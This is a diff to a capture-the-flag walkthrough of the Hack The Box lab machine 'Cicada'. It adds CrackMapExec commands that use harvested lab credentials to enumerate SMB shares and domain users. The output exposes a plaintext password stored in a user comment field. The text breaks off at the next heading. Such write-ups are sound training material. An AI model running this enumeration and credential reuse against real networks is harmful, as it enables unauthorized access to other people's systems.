@@ -308,6 +308,8 @@ SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrigh
 
 We've obtained valid credentials: `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`
 
+<br />
+
 ### michael.wrightson:
 
 <br />
@@ -336,3 +338,57 @@ HTTP        10.10.11.35     5985   CICADA-DC        [-] cicada.htb\michael.wrigh
 ```
 
 <br />
+
+This user doesn't has any additional permissions or access to a new share resources:
+
+<br />
+
+```bash
+❯ cme smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
+SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
+SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
+SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
+SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
+SMB         10.10.11.35     445    CICADA-DC        DEV                             
+SMB         10.10.11.35     445    CICADA-DC        HR              READ            
+SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
+SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
+SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
+```
+
+<br />
+
+Another useful CrackMapExec flag is `--users`, which serves a similar purpose to `--rid-brute`, but with a key difference: it requires valid `SMB` credentials.
+
+<br />
+
+```bash
+❯ cme smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+SMB         10.10.11.35     445    CICADA-DC        [*] Trying to dump local users with SAMRPC protocol
+SMB         10.10.11.35     445    CICADA-DC        [+] Enumerated domain user(s)
+SMB         10.10.11.35     445    CICADA-DC        cicada.htb\Administrator                  Built-in account for administering the computer/domain
+SMB         10.10.11.35     445    CICADA-DC        cicada.htb\Guest                          Built-in account for guest access to the computer/domain
+SMB         10.10.11.35     445    CICADA-DC        cicada.htb\krbtgt                         Key Distribution Center Service Account
+SMB         10.10.11.35     445    CICADA-DC        cicada.htb\john.smoulder                  
+SMB         10.10.11.35     445    CICADA-DC        cicada.htb\sarah.dantelia                 
+SMB         10.10.11.35     445    CICADA-DC        cicada.htb\michael.wrightson              
+SMB         10.10.11.35     445    CICADA-DC        cicada.htb\david.orelious                 Just in case I forget my password is aRt$Lp#7t*VQ!3
+SMB         10.10.11.35     445    CICADA-DC        cicada.htb\emily.oscars
+```
+
+<br />
+
+Interestingly, we find a plaintext password embedded in the user comment field: `david.orelious:aRt$Lp#7t*VQ!3`. This is a common misconfiguration in real-world environments and could lead to direct access.
+
+<br />
+
+### david.orelious:
+
+<br />
+
+
